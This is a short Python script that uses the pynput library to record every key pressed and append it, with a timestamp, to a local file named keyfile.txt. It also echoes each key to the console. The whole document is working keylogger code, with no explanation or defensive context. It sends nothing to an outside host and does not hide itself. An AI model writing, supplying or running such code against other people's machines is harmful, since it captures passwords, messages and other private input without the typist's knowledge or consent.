from pynput import keyboard
import datetime


def keyPressed(key):
    date = datetime.datetime.now()
    date = date.strftime('%d %m %Y %H:%M:%S')
    
    with open("keyfile.txt", "a") as logKey:
        print(str(key))
        output = str(key)
        for i in output:
            if i == "'":
                output = key.char
            else:
                pass
        logKey.write(f"({date}): ")
        logKey.write(output)
        logKey.write("\n")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input() 
